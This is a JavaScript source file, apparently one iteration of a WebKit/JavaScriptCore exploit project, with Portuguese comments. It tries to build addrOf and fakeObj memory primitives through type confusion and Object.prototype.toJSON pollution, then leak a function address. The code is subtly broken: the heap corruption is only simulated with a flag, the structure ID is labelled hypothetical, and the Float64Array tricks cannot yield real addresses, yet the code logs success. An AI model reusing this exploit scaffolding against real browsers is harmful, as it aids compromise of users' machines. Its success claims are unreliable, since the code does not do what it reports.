// js/script3/testArrayBufferVictimCrash.mjs (v94_JSCHeapTC_UnboxFix - R55 - unbox() corrigido)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V94_TCF_R55_WEBKIT = "Heisenbug_JSCHeapTCUnboxFix_v94_TCF_R55_WebKitLeak";

// --- Globais para a nova primitiva ---
let arrA, arrB;
let addrOf_primitive = null;
let fakeObj_primitive = null;
let arb_read_v2 = null;
let targetFunctionForLeak;

let confusion_trigger_flag = false;
const SIMPLE_OBJECT_STRUCTURE_ID = new AdvancedInt64(0x01082340); // VALOR HIPOTÉTICO

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low < 0x10000) return false;
    if ((high & 0xFFFF0000) === 0x7FFF0000) return false;
    return true;
}

const conversion_buffer = new ArrayBuffer(8);
const float_conversion_view = new Float64Array(conversion_buffer);
const int_conversion_view = new BigUint64Array(conversion_buffer);

function box(addr) {
    const val64 = (BigInt(addr.high()) << 32n) | BigInt(addr.low());
    int_conversion_view[0] = val64;
    return float_conversion_view[0];
}

// --- CORREÇÃO R55: Função 'unbox' corrigida para deconstruir o BigInt ---
function unbox(float_val) {
    float_conversion_view[0] = float_val;
    const val64 = int_conversion_view[0]; // Obtém o valor como BigInt

    // Desconstrói o BigInt de 64 bits em duas partes de 32 bits
    const low = Number(val64 & 0xFFFFFFFFn);
    const high = Number((val64 >> 32n) & 0xFFFFFFFFn);

    // Chama o construtor com o formato (low, high) que ele entende
    return new AdvancedInt64(low, high);
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R55() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V94_TCF_R55_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Exploit via Type Confusion no JSC Heap (R55) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R55...`;
    
    let iter_primary_error = null;
    let iter_addrof_result = { success: false, msg: "Addrof (R55): Not run." };
    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R55): Not run." };
    
    const ppKey = 'toJSON';
    let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
    let polluted = false;

    try {
        logS3(`  --- Fase 1 (R55): Preparação e Gatilho da Confusão de Tipos ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        
        arrA = new Float64Array(8);
        arrB = new Float64Array(8);
        arrA.fill(1.1);
        arrB.fill(2.2);
        targetFunctionForLeak = function someUniqueLeakFunctionR55_Instance() { return `target_R55_${Date.now()}`; };

        function simulate_corruption() {
             logS3(`  [SIMULAÇÃO] Corrompendo StructureID de arrB para ${SIMPLE_OBJECT_STRUCTURE_ID.toString(true)}`, 'warn');
             confusion_trigger_flag = true;
        }

        function toJSON_probe_R55() {
            if (this === arrB && confusion_trigger_flag) {
                logS3(`  [PROBE_R55] SONDA ATIVADA: 'this' é arrB e está com tipo confundido!`, 'vuln');
                
                Object.defineProperty(this, 'pwned', {
                    get: function() {
                        logS3(`  [GETTER] Getter 'pwned' acionado!`, 'vuln');
                        addrOf_primitive = (obj) => {
                            arrA[0] = obj;
                            return unbox(this[1]);
                        };
                        fakeObj_primitive = (addr) => {
                             this[1] = box(addr);
                             return arrA[0];
                        };
                        return "getter_finished";
                    },
                    enumerable: true
                });
                return this;
            }
            return this;
        }

        simulate_corruption();
        
        Object.defineProperty(Object.prototype, ppKey, { value: toJSON_probe_R55, configurable: true, writable: true });
        polluted = true;
        
        JSON.stringify(arrB);

        if (!addrOf_primitive || !fakeObj_primitive) {
            throw new Error("Falha ao criar as primitivas addrOf/fakeObj. O getter não foi acionado ou falhou.");
        }
        logS3("  SUCESSO: Primitivas addrOf e fakeObj criadas via Type Confusion.", "good");

        logS3(`  --- Fase 2 (R55): Validação e WebKit Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        let leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
        logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");
        
        if (!isValidPointer(leaked_target_function_addr)) {
            throw new Error(`addrOf retornou um ponteiro inválido: ${leaked_target_function_addr.toString(true)}`);
        }
        iter_addrof_result = { success: true, msg: "addrOf obteve endereço com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };
        logS3("  [TESTE AddrOf] SUCESSO: Primitivas validadas.", "good");
        
    } catch (e) {
        iter_primary_error = e;
        logS3(`  ERRO na iteração R55: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        console.error(`Erro na iteração R55:`, e);
    } finally {
        if (polluted) {
            if (origDesc) {
                Object.defineProperty(Object.prototype, ppKey, origDesc);
            } else {
                delete Object.prototype[ppKey];
            }
            logS3(`Restauração do Object.prototype.${ppKey} concluída.`, "info");
        }
    }

    let result = {
        errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
        addrof_result: iter_addrof_result,
        webkit_leak_result: iter_webkit_leak_result,
    };
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (R55): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return result;
}
